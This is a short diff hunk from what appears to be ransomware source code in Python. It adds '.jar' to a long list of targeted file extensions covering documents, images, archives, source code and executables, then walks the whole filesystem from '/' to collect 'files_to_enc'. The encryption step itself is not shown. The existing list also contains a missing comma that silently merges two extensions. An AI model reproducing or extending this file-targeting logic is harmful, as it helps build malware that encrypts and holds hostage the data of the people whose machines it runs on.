@@ -98,7 +98,7 @@ def select_files():
            ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
            ".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", ".exe", 
            ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h",
-           ".mov", ".gif", ".txt", ".py", ".pyc" ]
+           ".mov", ".gif", ".txt", ".py", ".pyc", ".jar"]
            
     files_to_enc = []
     for root, dirs, files in os.walk("/"):
